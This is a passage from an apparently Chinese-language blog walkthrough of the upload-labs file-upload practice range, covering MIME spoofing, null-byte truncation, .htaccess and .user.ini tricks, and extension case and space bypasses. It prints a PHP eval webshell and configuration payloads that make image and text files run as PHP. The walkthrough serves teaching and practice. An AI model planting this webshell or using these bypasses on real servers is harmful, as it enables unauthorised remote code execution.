title="二、白名单绕过"></a>二、白名单绕过</h3><p>白名单简单来说就是目标程序规定了能上传的后缀名</p><p>1、MIME类型检测绕过<br>MIME多用途网络邮件扩展类型，可被称为Media type或Content type，它设定某种类型的文件当被浏览器打开的时候需要用什么样的应用程序，多用于HTTP通信和设定文档类型例如HTML。之所以叫多用途网络邮件扩展类型，因为它最早被用于电子邮件系统，后用于浏览器。</p><p>常见的类型有：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823149.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822728.png"></p><p>那么在我们抓包的时候，content-type里面的值，就是文件的mime类型，如果后台是根据这个来判断文件类型的，那么就存在mime类型的检测绕过。</p><p><strong>即上传时抓包，将mine类型改为它允许上传的类型即可绕过验证</strong></p><p>2、路径栏00截断绕过<br>条件：</p><p>php版本&lt; 5.3</p><p>php.ini这个配置文件中 magic_quotes_gpc必须为 off</p><p>上传路径可控<br>必须满足这两个条件才能使用00截断</p><p>原理：</p><p>0x00是字符串的结束标识符，攻击者可以利用手动添加标识符的方式来将后面的内容弄进行截断，这样标识符后面的内容就能帮我们绕过检测<br>实例：</p><p>例如一个程序在代码中规定只允许上传png,jpg,gif后缀的文件，而我们需要上传一个名为aa.php的一句话木马文件，可以使用如下方法:</p><p>1、选中aa.php文件并上传，在上传时使用burp抓包,如下</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021822079.png"></p><p>2、修改文件保存路径和文件名</p><p>最初的保存路径是 ..&#x2F;upload&#x2F;,文件名是 aa.php,所以经过拼接后 aa.php上传后的相对路径位置是 ..&#x2F;upload&#x2F;aa.php<br>此时我们将文件报错路径修改为“..&#x2F;upload&#x2F;test.php%00aa.php”。%00是结束符的url编码格式</p><p>文件名修改为“aa.jpg”，如下</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823275.png"></p><p>此时我们上传的文件最后的路径就会拼接成为——“..&#x2F;upload&#x2F;test.php%00aa.jpg”，因为过滤规则只对文件名生效，也就是filename参数对应的“aa.jpg”，目标允许jpg文件上传，所以绕过过滤自然是没有问题的</p><p>很多人会问，那我们上传的aa.php中的一句话木马内容在哪去了？自然也就是在test.php里面去了。因为%00后面的语句不会被识别，所以能成功上传，内容也成功解析为php<br>此时访问test.php就能成功访问我们上传的php文件内容</p><h2 id="靶场练习-1"><a href="#靶场练习-1" class="headerlink" title="靶场练习"></a>靶场练习</h2><h3 id="Pass-01-禁用JS"><a href="#Pass-01-禁用JS" class="headerlink" title="Pass-01-禁用JS"></a>Pass-01-禁用JS</h3><p>目标：绕过文件上传限制，成功上传一个webshell(是一种恶意脚本或程序)并执行。</p><p>创建一个 PHP 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823877.png"></p><p>尝试上传</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021823380.png"></p><p>分析代码这是一个js拦截</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> file = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&#x27;upload_file&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;请选择要上传的文件!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">//定义允许上传的文件类型</span><br>    <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.png|.gif&quot;</span>;<br>    <span class="hljs-comment">//提取上传文件的类型</span><br>    <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_">substring</span>(file.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>    <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>        <span class="hljs-title function_">alert</span>(errMsg);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>方法一：直接禁用浏览器的js</p><p>（1）火狐：地址栏输入about:config<br>            搜索栏搜javascript.enabled<br>为ture是为开启JavaScript为false时为关闭JavaScript</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824428.png"></p><p>（2）右键—检查—调试器—设置—禁用JavaScript</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824981.png"></p><p>（3）扩展</p><p>方法二：删除checkFile()函数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824911.png"></p><p>测试成功：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824460.png"></p><h3 id="Pass-02-MIME类型"><a href="#Pass-02-MIME类型" class="headerlink" title="Pass-02-MIME类型"></a>Pass-02-MIME类型</h3><p>MIME类型：浏览器通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$_FILES[&#x27;file&#x27;][&#x27;type&#x27;]<br></code></pre></td></tr></table></figure><p>发送文件的MIME类型(如image&#x2F;jpeg)，但完全由客户端控制，攻击者可通过修改 HTTP 请求伪造此值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>)) &#123;<span class="hljs-comment">//</span><br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]            <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用burp抓包</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824258.png"></p><p>修改content-type(是向服务器告知传输的是什么文件)</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824502.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png"></p><p>复制图片链接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021824618.png"></p><p>验证通过</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825147.png"></p><h3 id="Pass-03-后缀伪造绕过"><a href="#Pass-03-后缀伪造绕过" class="headerlink" title="Pass-03-后缀伪造绕过"></a>Pass-03-后缀伪造绕过</h3><h6 id="前置条件："><a href="#前置条件：" class="headerlink" title="前置条件："></a>前置条件：</h6><p>1.切换版本</p><p><a href="https://blog.csdn.net/qq_43696276/article/details/126445465">记录BUG—在uploadlabs第三关中—关于phpstudy中修改httpd.conf依旧无法解析.php3d等问题_upload-labs无法解析php3-CSDN博客</a></p><p>修改后缀来绕过检查，例如修改为”.php3”,”.php5”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825852.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825443.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825722.png"></p><h3 id="Pass-04-htaccess-配置解析绕过"><a href="#Pass-04-htaccess-配置解析绕过" class="headerlink" title="Pass-04-.htaccess 配置解析绕过"></a>Pass-04-<code>.htaccess</code> 配置解析绕过</h3><h6 id="前置条件：-1"><a href="#前置条件：-1" class="headerlink" title="前置条件："></a>前置条件：</h6><p>1.<code>mod_rewrite</code>模块开启。</p><p>（1）打开<code>httpd.conf</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021825083.png"></p><p>（2）检查<code>#LoadModule rewrite_module modules/mod_rewrite.so</code>，去掉前面的<code>#</code></p><p>若没有<code>LoadModule rewrite_module modules/mod_rewrite.so</code>，可以随便找一个LoadModule语句的附近添加</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931287.png"></p><p>（3）确保<code>mod_rewrite.so</code>文件存在</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931712.png"></p><p>（4）配置<code>.htaccess</code>支持</p><p>打开<code>httpd.conf</code>，搜索找到<code>AllowOverride</code>，将后面的NONE改为ALL，保险起见，俩处都改。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931226.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931817.png"></p><p>（5）在<code>httpd.conf</code>文件的末尾添加以下内容，确保<code>RewriteEngine</code>已启用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;IfModule mod_rewrite.c&gt;<br>    RewriteEngine On<br>&lt;/IfModule&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931662.png"></p><p>（6）保存！！！保存！！！保存！！！</p><p>（7）测试</p><p>在网站根目录<code>www</code>下创建一个<code>.htaccess</code>文件，写入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">RewriteEngine On<br>RewriteRule ^test$ index.php [L]<br></code></pre></td></tr></table></figure><p>然后访问<code>http://域名/test</code>，如果跳转到<code>index.php</code>，说明<code>mod_rewrite</code>已启用。</p><p>2.<code>.htaccess</code></p><p><code>.htaccess</code> 是一个配置文件，主要用于 Apache 服务器。它放在网站的某个目录里，用来控制该目录及其子目录的行为。</p><p>新建一个<code>.htaccess</code>文件，注意：<strong>.htaccess文件不能有文件名，否则不运行！！！</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">AddType application/x-httpd-php .jpg .txt<br>//这行代码的意思是让服务器把 .jpg 和 .txt 文件当作 PHP 脚本来执行。<br>//AddType 是 .htaccess 中的一个指令，用来指定文件类型和处理方式。<br>//application/x-httpd-php 是 PHP 文件的 MIME 类型，表示用 PHP 解析器处理这些文件。<br>//.jpg .txt 是文件扩展名，表示对这两种文件应用该规则。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931923.png"></p><p>上传<code>.htaccess</code>文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931269.png"></p><p>之后上传一句话木马图片（图片可以直接由php文件改后缀名为jpg）</p><p>链接成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931523.png"></p><h3 id="Pass-05-user-ini-自动包含绕过"><a href="#Pass-05-user-ini-自动包含绕过" class="headerlink" title="Pass-05- .user.ini 自动包含绕过"></a>Pass-05- <code>.user.ini</code> 自动包含绕过</h3><h6 id="前置条件：-2"><a href="#前置条件：-2" class="headerlink" title="前置条件："></a>前置条件：</h6><p>1.<code>.user.ini</code> 是一个配置文件，它类似于 <code>.htaccess</code>，但专门用于配置 PHP 的行为。可以把它放在网站的某个目录中，用来覆盖服务器的主 PHP 配置（<code>php.ini</code>），在不修改服务器全局配置的情况下，灵活调整 PHP 的行为。</p><p>2.切换版本</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021931309.png"></p><p>写一个<code>.user.ini</code>配置文件，上传到服务器，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">auto_prepend_file=1.txt<br>// PHP 在执行每个脚本之前，自动预加载指定的文件1.txt。<br>具体解释<br>auto_prepend_file：这是一个 PHP 配置选项，用于指定一个文件路径。PHP 会在执行每个脚本之前，先加载并运行这个文件。<br>1.txt：这是你指定的文件路径。PHP 会尝试加载这个文件，并将其内容作为 PHP 代码执行。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932348.png"></p><p>再上传一个<code>1.txt</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932332.png"></p><p>在蚁剑中输入url时，最后一项不要写1.txt，而是readme.php，这个文件是靶场自带的一个php文件，而你的.user.ini文件中写的就是启动php文件的时候启动1.txt，所以要启动的是readme.php</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932536.png"></p><h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06_大小写绕过"></a>Pass-06_大小写绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Windows系统对大小写并不敏感，而这个检测机制它是区分大小写的，所以我们只需要随机让几个字母大小写互换即可。</p><p>切换版本！</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932010.png"></p><p>使用BP抓包，将文件后缀名的小写变成大写</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932497.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021932202.png"></p><h3 id="Pass-07-空格绕过"><a href="#Pass-07-空格绕过" class="headerlink" title="Pass-07_空格绕过"></a>Pass-07_空格绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span 